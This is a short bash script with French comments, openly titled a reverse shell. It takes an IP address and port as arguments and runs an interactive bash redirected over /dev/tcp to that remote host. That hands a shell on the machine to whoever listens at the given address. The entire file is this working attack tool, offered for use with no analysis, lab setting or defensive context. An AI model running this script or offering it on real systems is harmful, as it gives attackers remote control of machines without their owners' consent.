#!/bin/bash

# Reverse Shell Bash
# Utilisation : ./reverse-shell.sh <IP> <PORT>

if [ "$#" -ne 2 ]; then
  echo "Usage : $0 <IP> <PORT>"
  exit 1
fi

IP=$1
PORT=$2

echo "[*] Tentative de connexion à $IP sur le port $PORT..."
bash -i >& /dev/tcp/$IP/$PORT 0>&1